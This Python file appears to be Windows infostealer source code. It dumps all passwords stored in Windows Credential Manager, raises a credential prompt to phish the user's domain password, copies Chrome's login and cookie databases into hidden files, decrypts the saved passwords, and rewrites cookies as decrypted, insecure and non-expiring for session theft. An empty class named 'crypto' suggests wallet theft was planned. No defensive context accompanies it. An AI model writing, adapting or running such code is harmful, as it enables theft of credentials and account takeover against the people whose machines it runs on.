import os
import io
import sys
import sqlite3
import json
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC

class credentials:
    def dump_credsman_generic():
        CredEnumerate = win32cred.CredEnumerate
        CredRead = win32cred.CredRead
        try:
            creds = CredEnumerate(None, 0)
        except Exception as e:
            print(e)
            pass
        credentials = []
        for package in creds:
            try:
                target = package['TargetName']
                creds = CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)
            except pywintypes.error:
                pass
        credman_creds = io.StringIO()
        for cred in credentials:
            service = cred['TargetName']
            username = cred['UserName']
            password = cred['CredentialBlob'].decode()
            credman_creds.write('Service: ' + str(service) + '\n')
            credman_creds.write('Username: ' + str(username) + '\n')
            credman_creds.write('Password: ' + str(password) + '\n')
            credman_creds.write('\n')
        return credman_creds.getvalue()
    def prompt_for_domain_creds():
        CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials
        creds = []
        try:
            creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
        except Exception:
            pass
        return creds
    def dump_chrome_passwords():
        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
            shutil.copy2(login_data, './Login Data')
            win32api.SetFileAttributes('./Login Data', win32con.FILE_ATTRIBUTE_HIDDEN)
        except Exception:
            pass
        chrome_credentials = io.StringIO()
        try:
            conn = sqlite3.connect('./Login Data', )
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            results = cursor.fetchall()
            conn.close()
            os.remove('Login Data')
            for action_url, username_value, password_value in results:
                password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1]
                if password:
                    chrome_credentials.write('URL: ' + action_url + '\n')
                    chrome_credentials.write('Username: ' + username_value + '\n')
                    chrome_credentials.write('Password: ' + str(password) + '\n')
                    chrome_credentials.write('\n')
            return chrome_credentials.getvalue()
        except sqlite3.OperationalError as e:
            print(e)
            pass
        except Exception as e:
            print(e)
            pass
class cookies:
    def get_chrome_cookies():
        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies'
            shutil.copy2(login_data, './Cookies')
            win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)
        except Exception:
            pass
        try:
            conn = sqlite3.connect('./Cookies')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
            results = cursor.fetchall()
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",(decrypted_value, host_key, name));
            conn.commit()
            conn.close()
        except Exception as e:  
            print(e)
            pass
class crypto:
    pass
print(cookies.get_chrome_cookies())
